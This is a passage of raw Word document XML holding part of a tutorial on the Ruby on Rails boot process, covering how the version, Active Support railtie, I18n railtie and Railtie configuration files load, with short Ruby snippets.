        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> of the Active Support Core Extensions Guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0230D422" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once that file has finished loading, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Plugin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is defined.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2646BC0C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.32 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/application.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A8EBD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Jumping back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> now. This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class where the application’s class inherits from. This class (and its superclasses) define the basic behaviour on the application’s constant such as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method used for configuring the application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256C2232" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once this file’s done then we go back to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file, which next requires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/version</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4068AD83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.33 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/version.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD540CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Much like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, this file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>VERSION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant which has a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>STRING</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant on it which returns the current version of Rails.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3223B384" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once this file has finished loading we go back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which then requires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EAAADE4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.34 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DDBCA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file requires </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which have already been required so these two lines are effectively ignored. The third require in this file is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/i18n_railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199A13D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.35 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/i18n_railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F76D5A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This file is the first file that sets up configuration with these lines inside the class:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0E069821" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D2AFE86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Railtie &lt; Rails::Railtie</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15731294" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  config.i18n = ActiveSupport::OrderedOptions.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A9C7E92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  config.i18n.railties_load_path = []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60B099D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  config.i18n.load_path = []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="720A3E58" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  config.i18n.fallbacks = ActiveSupport::OrderedOptions.new</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E06DBAB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By inheriting from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie#inherited</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is called:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7FDFDB16" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5825F301" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>inherited(base)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42E85CEF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  unless</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>base.abstract_railtie?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6742020E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    base.send(:include, Railtie::Configurable)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A55CCFE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    subclasses &lt;&lt; base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78A61A6A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1750552A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="49E4C8FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This first checks if the Railtie that’s inheriting it is a component of Rails itself:</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06517E4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68FF5E43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ABSTRACT_RAILTIES</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= %w(Rails::Railtie Rails::Plugin Rails::Engine Rails::Application)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27D00DB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73AA724D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CEFF1DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C1E1807" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>abstract_railtie?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="398CAAAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ABSTRACT_RAILTIES.include?(name)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="647C5210" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="115244C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Because </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> isn’t in this list, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>abstract_railtie?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Therefore the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Railtie::Configurable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module is included into this class and the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>subclasses</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is called and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is added to this new array.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2568"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="706430D5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C250339" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>subclasses</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52F96A63" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @subclasses</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>||= []</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45733926" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4EB246E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method used at the top of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is defined on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and is defined like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4968"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="35CE24B4" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2856D892" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26BF2BE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @config</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>||= Railtie::Configuration.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F045F71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4062DF23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">At this point, that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Railtie::Configuration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant is automatically loaded which causes the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/railties/configuration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file to be loaded. The line for this is this particular line in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0E82FD03" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C172213" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1940018237"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>autoload :Configuration, "rails/railtie/configuration"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="523101DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.36 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/railtie/configuration.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D20F704" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file begins with a require out to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/configuration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which has already been required earlier in the process and so isn’t required again.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B120BB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie::Configuration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class which is responsible for providing a way to easily configure railties and it’s the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method here which is called by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method back in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>i18n_railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file. The methods on this object don’t exist, and so are rescued by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>method_missing</w:t>
